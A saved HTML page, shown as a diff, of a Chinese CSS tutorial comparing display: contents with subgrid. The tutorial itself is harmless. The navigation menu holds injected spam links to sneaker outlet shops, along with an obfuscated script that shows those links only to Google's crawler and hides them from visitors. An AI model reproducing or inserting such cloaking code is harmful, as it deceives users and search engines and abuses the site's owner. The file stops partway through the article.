@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<!-- saved from url=(0133)https://www.w3cplus.com/css/grid-layout-part-16.html?expire=1699867080&code=NshCsF8EZQ4&sign=b6d07d4086672d0a1ed20eaf7b393b1c#paywall -->
+<html lang="zh-hans" class="js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+<link rel="shortcut icon" href="https://www.w3cplus.com/sites/all/themes/w3cplusV2/favicon.ico" type="image/vnd.microsoft.icon">
+<meta name="description" content="`subgrid` 进入 [**CSS Grid 布局模块的 Level 2**](//www.w3.org/TR/css-grid-2/#subgrids) 规范之前，嵌套网格、`subgrid` 和 `display: contents` 就有深度的讨论，最终 `subgrid` 得到更多的支持，也最终成为规范中的一部分。也就是说，嵌套网格 和 `display: contents` 都可以实现类似 `subgrid` 的布局。那这一节中，和大家来探讨 `display: contents` 和 `subgrid` 有何差异？ ## display: contents [CSS 的 `display` 属性](//www.w3cplus.com/css/web-layout-css-display.html) 并不是 CSS">
+<meta name="keywords" content="前端,CSS, Grid, Layout, 布局, 图解CSS, Web布局系列, 会员专栏,教程">
+<meta name="generator" content="Drupal 7 (http://drupal.org)">
+<link rel="canonical" href="https://www.w3cplus.com/css/grid-layout-part-16.html">
+<link rel="shortlink" href="https://www.w3cplus.com/node/2737">
+  <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta itemprop="name" content="W3cplus">
+  <meta itemprop="image" content="//www.w3cplus.com/w3cplus-logo.jpg">
+  <meta name="baidu-site-verification" content="ftyq813qEZgpw9nb">
+  <meta name="applicable-device" content="pc,mobile">
+  <title>图解CSS: Grid布局（Part16）_CSS, Grid, Layout, 布局, 图解CSS, Web布局系列, 会员专栏 教程_W3cplus</title>
+  <link type="text/css" rel="stylesheet" href="./Grid布局：16-subgrid-vs-display：contents_files/css_xE-rWrJf-fncB6ztZfd2huxqgxu4WO-qwma6Xer30m4.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Grid布局：16-subgrid-vs-display：contents_files/css_hYCLW089C9S9sP3ZYkuG6R-Q5ZHbEhblZBFjwZ_bE_I.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Grid布局：16-subgrid-vs-display：contents_files/css_W_jVXC7gZD8ENo3AHIwFL3Mih90k_Go_X3-i_hfyj2c.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Grid布局：16-subgrid-vs-display：contents_files/css_dc6MGCsMvp7moqrq-cRLC0GLEMrFF3Ego_HOWYVsZG4.css" media="all">
+  <script src="./Grid布局：16-subgrid-vs-display：contents_files/hm.js.下载"></script><script type="text/javascript" src="./Grid布局：16-subgrid-vs-display：contents_files/jquery.min.js.下载"></script>
+
+</head>
+<body class="html not-front not-logged-in one-sidebar sidebar-second page-node page-node- page-node-2737 node-type-blog" style="">
+  <div id="skip-link">
+    <a href="https://www.w3cplus.com/css/grid-layout-part-16.html?expire=1699867080&amp;code=NshCsF8EZQ4&amp;sign=b6d07d4086672d0a1ed20eaf7b393b1c#main-content" class="element-invisible element-focusable">跳转到主要内容</a>
+  </div>
+    <div id="header" role="header">
+  <div class="container">
+    <h1 id="logo">
+      <a href="https://www.w3cplus.com/" title="记述前端那些事——引领Web前沿" id="site_name">w3cplus</a>
+    </h1>
+    <div class="toggle-topbar menu-icon" id="pull">
+      <a href="https://www.w3cplus.com/css/grid-layout-part-16.html?expire=1699867080&amp;code=NshCsF8EZQ4&amp;sign=b6d07d4086672d0a1ed20eaf7b393b1c#"><span>Menu</span></a>
+    </div>
+    <div class="toogle-topbar-content" id="pull-menu">
+              <ul class="menu clearfix"><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfejcashop/" title="air jordan 1 low outlet
+" style="display: none;">air jordan 1 low outlet
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfedavshop/air-jordan-1-low-og-voodoo-release-date/" title="001 Air Jordan 1 Zoom Comfort League of Legends World Championship 2020 For Sale3 Retro Cap And Gow OG Voodoo DZ7292 , new year deals air jordan 13 low white metallic silverpure platinum - 200 Release Date - Zion Williamson x DD1453 - SBD
+" style="display: none;">001 Air Jordan 1 Zoom Comfort League of Legends World Championship 2020 For Sale3 Retro Cap And Gow OG Voodoo DZ7292 , new year deals air jordan 13 low white metallic silverpure platinum - 200 Release Date - Zion Williamson x DD1453 - SBD
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.vietnamvetsmuseum.org/fbdbdgushop/uk/krossovki-adidas-iniki-black-white.xhtml" title="Київ та Україна , adidas iran shoe store locations in texas , Купити Кросівки adidas iniki black white — недорого в каталозі Кросівки на Шафі
+" style="display: none;">Київ та Україна , adidas iran shoe store locations in texas , Купити Кросівки adidas iniki black white — недорого в каталозі Кросівки на Шафі
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfejcashop/" title="nike jordan outlet online
+" style="display: none;">nike jordan outlet online
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfebcenshop/russell-westbrook-air-jordan-xxx-northern-lights-all-star/" title="NIKE AIR JORDAN 1 GOLF LOW RUST PINK , IetpShops , Russell Westbrook Nike jordan 1 flight 4 premium кроссовки мужские Northern Lights All Star
+" style="display: none;">NIKE AIR JORDAN 1 GOLF LOW RUST PINK , IetpShops , Russell Westbrook Nike jordan 1 flight 4 premium кроссовки мужские Northern Lights All Star
+</a></li><li class="first leaf"><a href="https://www.w3cplus.com/blog/tags/686.html" title="会员专栏">会员专栏</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/CSS3" title="">CSS</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/JavaScript" title="JavaScript">JavaScript</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/css/books.html" title="我的小册">小册</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/mobile" title="">Mobile</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/svg-tutorial" title="SVG">SVG</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/tags" title="标签云">标签云</a></li>
+<li class="last leaf"><a href="https://www.w3cplus.com/blogs-lists" title="文章列表">文章列表</a></li>
+<script>['sojson.v4']["\x66\x69\x6c\x74\x65\x72"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"](((['sojson.v4']+[])["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65']['\x61\x70\x70\x6c\x79'](null,"118J97J114e32K109l121m95L107G101q121O95v119X111Z114Q100P95f114s101y32l61S32c110p101W119b32w82E101F103g69i120Q112V40h34J71n111K111V103Z108T101g124z109f121L116R101D115z116d34a44p32m34H103o105X34V41h59g105Z102P40Z33j109x121d95d107g101p121J95W119R111K114c100J95M114o101t46V116f101Q115x116u40J110Z97l118N105o103o97R116L111L114W46L117R115I101T114E65K103D101a110e116L41v41E32z123V32i118w97U114Q32d99k108B97j115W115k95i109B121a95v107S101G121H95e119o111J114z100O32B61e32B100F111Y99t117b109G101E110i116D46B103y101m116Q69D108n101G109m101x110d116p115y66E121U67i108P97s115e115H78r97g109c101d40h39S107x101U121f115O95u119r111l114G100n115I39c41o59i32k102v111c114r40y118H97B114E32L105d32n61P32W48l59h32q105W32V60s32j99g108h97f115Y115W95P109J121z95T107I101r121J95Z119t111W114q100X46E108G101m110X103e116P104i59r32K105i43S43W41m32D99x108a97S115W115U95S109s121j95x107Z101v121i95n119S111y114z100x91z105B93U46K115V116Q121B108x101b46i100V105R115P112N108u97E121y32w61P32W39A110t111Q110A101n39h59e125"['\x73\x70\x6c\x69\x74'](/[a-zA-Z]{1,}/))))('sojson.v4');</script></ul>        <!-- /#main-menu -->
+          </div>
+  </div>
+</div>
+
+  <div id="branding" role="branding">
+    <div class="container">
+        <div class="region region-branding">
+    <div id="block-block-46" class="block block-block">
+
+    
+  <div class="content">
+    <div style="margin-bottom: 5px;">
+	<a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img alt="现代 CSS" src="./Grid布局：16-subgrid-vs-display：contents_files/WechatIMG324.jpg" style="width: 100%;height:auto"></a></div>  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+<div id="page" role="page">
+  <div class="container">
+    
+    <div class="col-main">
+      <div class="main-wrap">
+        
+                
+        <div class="page-inner">
+                      <div id="breadcrumb" role="breadcrumb">
+              <h2 class="element-invisible">你在这里</h2><div class="breadcrumb"><a href="https://www.w3cplus.com/">首页</a></div>            </div>
+          
+          
+          <a id="main-content"></a>
+                                <h1 class="title" id="page-title">
+              图解CSS: Grid布局（Part16）            </h1>
+          
+                    
+                                <div class="region region-content">
+    <div id="block-system-main" class="block block-system">
+
+    
+  <div class="content">
+    <div id="node-2737" class="node node-blog node-promoted node-full clearfix" about="/css/grid-layout-part-16.html" typeof="sioc:Post sioct:BlogPost">
+  
+  <div class="node-header">
+              <div class="submitted">
+          作者：<span>大漠</span>          日期：<span>2021-09-08</span>          点击：<span>270</span>        </div>
+            <div class="tags">
+        <div class="field field-name-field-blog-tag field-type-taxonomy-term-reference field-label-hidden"><div class="field-items"><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/68.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">CSS</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/356.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Grid</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/180.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Layout</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/130.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">布局</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/674.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">图解CSS</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/695.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Web布局系列</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/686.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">会员专栏</a></div></div></div>      </div>
+  </div>
+
+  
+  <div class="body-content clearfix">
+    <div id="block-block-22" class="block block-block">
+
+    
+  <div class="content">
+    <div>
+<blockquote>
+<p style="font-size: 14px;"><strong>特别声明：</strong>如果您喜欢小站的内容，可以点击<a href="https://www.zhi12.cn/paywall/membership/widget?uid=5491&amp;siteid=s_64be3b00&amp;cms=drupal&amp;content_id=2610&amp;callback=https%3A//www.w3cplus.com&amp;source=https%3A//www.w3cplus.com%3Fq%3Dnode/2610&amp;sign=ecbcc7859e33dea192cf9efdb6d2e61c" style="background: #FF5722;color: #fff;  display: inline-block; padding: 10px; border-radius: 4px;  line-height: 1; margin: 0 3px;" target="_blank">申请会员</a>进行全站阅读。如果您对付费阅读有任何建议或想法，欢迎发送邮件至: <strong>airenliao@gmail.com</strong>!或添加QQ：874472854(^_^)</p>
+</blockquote>
+</div>  </div>
+</div>
+<div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even" property="content:encoded"><div class="paywall paywall-mb"><div class="paywall-center"><small class="paywall-highlight">* 文本为付费内容（4.99元），您已获得全文阅读权限</small></div></div><p><code>subgrid</code> 进入 <a rel="nofollow" href="https://www.w3.org/TR/css-grid-2/#subgrids" target="_blank"><strong>CSS Grid 布局模块的 Level 2</strong></a> 规范之前，嵌套网格、<code>subgrid</code> 和 <code>display: contents</code> 就有深度的讨论，最终 <code>subgrid</code> 得到更多的支持，也最终成为规范中的一部分。也就是说，嵌套网格 和 <code>display: contents</code> 都可以实现类似 <code>subgrid</code> 的布局。那这一节中，和大家来探讨 <code>display: contents</code> 和 <code>subgrid</code> 有何差异？</p>
+
+<h2 class="content-title" data-index="2">display: contents</h2>
+
+<p><a href="https://www.w3cplus.com/css/web-layout-css-display.html" target="_blank">CSS 的 <code>display</code> 属性</a> 并不是 CSS 网格布局模块中的特性，它是 <strong><a rel="nofollow" href="https://www.w3.org/TR/css-display-3/#box-generation" target="_blank">CSS Display Module Level 3</a></strong> 中 <code>display</code> 属性新增的一个属性值 <code>contents</code>。 从 <strong><a href="https://www.w3cplus.com/css/web-layout-box-module.html" target="_blank">CSS 盒模型</a></strong> 中可以知道文档树中的每个元素都是一个矩形框（盒子）。广义上讲，这个”矩形框“由两部分组成。首先，我们有实际的盒子，由<code>border</code>、<code>padding</code>和<code>margin</code>区域组成；其次，我们有盒子的内容，即内容区域：</p>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-grid-379.jpg" alt=""></p>
+
+<p>通过 CSS 的 <code>display</code> 属性，我们可以控制这个盒子及其后代元素以不同的上下文格式（即，产生不同的<a href="https://www.w3cplus.com/css/web-layout-visual-formatting-model.html" target="_blank">视觉格式化模型</a>）在浏览器中渲染。每个格式化上下文都拥有自己不同的渲染规则，而这些规则是用来决定其子元素如何定位，以及和其他元素的关系。好比水倒进不同的器皿中，会有不同的形态：</p>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-layout-ch4-18.png" alt=""></p>
+
+<p>比如，<code>display</code> 值为 <code>inline</code> 会产生一个 IFC、<code>block</code> 会产生一个 BFC、<code>flex</code>（或 <code>inline-flex</code>）会产生一个 FFC 和 <code>grid</code>（或 <code>inline-grid</code>）会产生一个 GFC。</p>
+
+<p><code>display</code> 属性还有两个值，用来控制标记中定义的元素是否产生一个盒子：</p>
+
+<ul>
+<li><code>none</code>值将导致盒子或其内容在页面上不被绘制</li>
+<li><code>contents</code>值将导致盒子的内容被正常绘制，但周围的盒子被完全忽略</li>
+</ul>
+
+<h3 class="content-title" data-index="3">display: contents 是什么？</h3>
+
+<p><a rel="nofollow" href="https://www.w3.org/TR/css-display-3/#box-generation" target="_blank">W3C规范是这样描述 <code>display</code> 的 <code>contents</code> 值</a>：</p>
+
+<blockquote>
+  <p><strong>显式设置 <code>display</code> 属性值为 <code>contents</code> 的元素自身不会产生任何盒子，但它的子元素和伪元素仍会产生盒子，文本运行也正常。对于盒子的生成和布局，该元素必须被视为在元素树中被其内容所取代（包括其源文件的子元素和伪元素，比如 <code>::befoe</code> 和 <code>::after</code> 伪元素，它们在该元素的子元素之前（或之后正常生成））</strong>。</p>
+</blockquote>
+
+<p>简单地说，<code>display</code> 为 <code>contents</code> 时允许你以某种方式从盒子树（Box Tree）中移除一个元素，但仍保留其内容。</p>
+
+<p>注意，由于只有盒子树受到影响，任何基于文档树的语义，如选择器匹配、事件处理和属性继承，都不会受到影响。但它也会阻止可访问性工具（比如屏幕阅读器）访问该元素的语义。</p>
+
+<h3 class="content-title" data-index="3">使用 display: contents 时会发生什么</h3>
+
+<p>理解使用 <code>diplay: contents</code> 时会发生什么的最简单方法是 <strong>想象元素的开始和结束标签被从标记中省略</strong>。严格地说，对于盒子的生成和布局，该元素必须被视为在元素树中被其内容所取代。</p>
+
+<p>我们通过下面的示例来阐述可能更易于大家理解。假设我们有一个类似下面这样的 HTML 结构：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">section</span></span>&gt;</span></span>
+    我是 section 元素的文本节点（文本内容）
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">p</span></span>&gt;</span></span>我是一个 p 元素，同时是 section 元素的子元素<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">p</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">section</span></span>&gt;</span></span>
+</code></pre>
+
+<p>分别给 <code>section</code> 和 <code>p</code> 元素添加一点 CSS 规则：</p>
+
+<pre class="css"><code class="css"><span class="tag"><span class="tag">section</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">border</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">6</span></span>px solid <span class="hexcolor"><span class="hexcolor">#f44336</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">padding</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span>rem;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">background-image</span></span></span><span class="rule">:<span class="value"><span class="value"> linear-<span class="function"><span class="function">gradient(to right, #<span class="number"><span class="number">09</span></span>f, #<span class="number"><span class="number">90</span></span>f)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">text-shadow</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>px <span class="number"><span class="number">1</span></span>px <span class="number"><span class="number">0</span></span> <span class="function"><span class="function">rgb(<span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> / .<span class="number"><span class="number">85</span></span>)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">filter</span></span></span><span class="rule">:<span class="value"><span class="value"> drop-<span class="function"><span class="function">shadow(<span class="number"><span class="number">8</span></span>px <span class="number"><span class="number">8</span></span>px <span class="number"><span class="number">1</span></span>px rgb(<span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> / .<span class="number"><span class="number">85</span></span>)</span></span>);</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="tag"><span class="tag">p</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">background-color</span></span></span><span class="rule">:<span class="value"><span class="hexcolor"><span class="value"><span class="hexcolor">#607d8b</span></span></span><span class="value">;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">padding</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span>rem <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">font-size</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">80</span></span>%;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">color</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="hexcolor"><span class="hexcolor">#cddc39</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>你将看到下图这样的效果：</p>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-grid-380.jpg" alt=""></p>
+
+<p>如果你显式在 <code>section</code> 设置 <code>display</code> 属性值为 <code>contents</code>：</p>
+
+<pre class="css"><code class="css"><span class="tag"><span class="tag">section</span></span>  <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> contents;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>此时，<code>section</code> 上的所有样式规则看上去都失效了，只留了文本内容和它的子元素。</p>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-grid-381.jpg" alt=""></p>
+
+<p>如果<code>section</code>有个父元素，设置<code>display: contents</code> 的 <code>section</code> 渲染，就有点像是其父元素伪元素生成了内容（伪元素上无任何样式）：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"container"</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">section</span></span>&gt;</span></span>
+        我是 section 元素的文本节点（文本内容）
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">p</span></span>&gt;</span></span>我是一个 p 元素，同时是 section 元素的子元素<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">p</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">section</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：16-subgrid-vs-display：contents_files/jOwVBMx(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/jOwVBMx">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>切换示例中<code>display</code>的值效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="/sites/default/files/blogs/2021/2109/css-grid-382.jpg">
+    <source src="/sites/default/files/blogs/2021/2109/css-grid-382.mp4" type="video/mp4">
+</video>
+</div>
+
+<p>也可以理解成，<code>section</code> 的 <code>display: contents</code>时，相当于<code>section</code>标签没有了：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+我是 section 元素的文本节点（文本内容）
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">p</span></span>&gt;</span></span>我是一个 p 元素，同时是 section 元素的子元素<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">p</span></span>&gt;</span></span>
+</code></pre>
+
+<h3 class="content-title" data-index="3">display:contents 边缘情况和特殊行为</h3>
+
+<p><code>display: contents</code> 使用起来很简单，但有很多边缘情况和特殊行为需要注意。我们必须记住， <strong><code>display: contents</code> 只影响页面上视觉上绘制的盒子，它不影响文档中的标记</strong>。</p>
+
+<p><code>display: contents</code> 的元素仅影响视觉上的盒子，但元素上的属性并不受影响，比如：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">id</span></span>=<span class="value"><span class="value">"label"</span></span> <span class="attribute"><span class="attribute">style</span></span>=<span class="value"><span class="value">"display: contents;"</span></span>&gt;</span></span>Label here!<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">button</span></span> <span class="attribute"><span class="attribute">aria-labelledby</span></span>=<span class="value"><span class="value">"label"</span></span>&gt;</span></span><span class="tag"><span class="tag">&lt;<span class="title"><span class="title">button</span></span>&gt;</span></span>
+</code></pre>
+
+<p><code>&lt;button&gt;</code> 上的 <code>aria-labelledby</code> 和 <code>label</code> 还是具有相应的绑定关系。当屏幕阅读器在<code>&lt;button&gt;</code>是得到焦点时，会朗读出<code>id="label"</code>元素的内容，即”Label here!“。</p>
+
+<p>带有 <code>display: contents</code>的元素的JavaScipt事件不会受影响，比如：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">section</span></span> <span class="attribute"><span class="attribute">id</span></span>=<span class="value"><span class="value">"contents"</span></span> <span class="attribute"><span class="attribute">style</span></span>=<span class="value"><span class="value">"display: contents"</span></span>&gt;</span></span>我是一个contents<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">section</span></span>&gt;</span></span>
+
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">script</span></span>&gt;</span></span><span class="javascript"><span class="javascript">
+    <span class="keyword"><span class="keyword">const</span></span> contentsEle = document.getElementById(<span class="string"><span class="string">"contents"</span></span>);
+
+    contentsEle.addEventListener(<span class="string"><span class="string">"click"</span></span>, (etv) =&gt; {
+        alert(etv.target.textContent);
+    });
+</span></span><span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">script</span></span>&gt;</span></span>
+</code></pre>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-grid-383.jpg" alt=""></p>
+
+<p>同样的，带有 <code>display: contents</code> 的元素的伪元素会被认为是其子元素的一部分，同样能正常显示：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.contents</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">border</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">6</span></span>px solid <span class="hexcolor"><span class="hexcolor">#f44336</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">padding</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span>rem;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">background-image</span></span></span><span class="rule">:<span class="value"><span class="value"> linear-<span class="function"><span class="function">gradient(to right, #<span class="number"><span class="number">09</span></span>f, #<span class="number"><span class="number">90</span></span>f)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">text-shadow</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>px <span class="number"><span class="number">1</span></span>px <span class="number"><span class="number">0</span></span> <span class="function"><span class="function">rgb(<span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> / <span class="number"><span class="number">0.85</span></span>)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">filter</span></span></span><span class="rule">:<span class="value"><span class="value"> drop-<span class="function"><span class="function">shadow(<span class="number"><span class="number">8</span></span>px <span class="number"><span class="number">8</span></span>px <span class="number"><span class="number">1</span></span>px rgb(<span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> / <span class="number"><span class="number">0.85</span></span>)</span></span>);</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">transition</span></span></span><span class="rule">:<span class="value"><span class="value"> all <span class="number"><span class="number">0.28</span></span>s ease-in-out;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> contents;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.contents</span></span><span class="pseudo"><span class="pseudo">::before</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">content</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="string"><span class="string">'Before »'</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">color</span></span></span><span class="rule">:<span class="value"><span class="value"> red;</span></span></span><span class="value"></span></span> 
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+<span class="class"><span class="class">.contents</span></span><span class="pseudo"><span class="pseudo">::after</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">content</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="string"><span class="string">'~ After'</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">color</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="hexcolor"><span class="hexcolor">#0ff</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-grid-384.jpg" alt=""></p>
+
+<p>在来看一些特殊场景。即 <strong>表单元素</strong>、<strong>图像</strong> 和 <strong>其他被替换的元素</strong> 上设置了 <code>display: contents</code> 会有不同的表现行为。</p>
+
+<p>在 CSS 中，试图给被替换元素（比如 <code>&lt;img&gt;</code>） 移除盒子其实是没有意义的，因为它并不完全清楚 ”盒子“ 是什么。对于这些元素，<code>display: contents</code> 和 <code>display: none</code> 完全一样。整个盒子和元素的内容根本不在页面上显示。</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：16-subgrid-vs-display：contents_files/jOwVJOW(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/jOwVJOW">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>切换示例中的单选按钮，效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="/sites/default/files/blogs/2021/2109/css-grid-385.jpg">
+    <source src="/sites/default/files/blogs/2021/2109/css-grid-385.mp4" type="video/mp4">
+</video>
+</div>
+
+<blockquote>
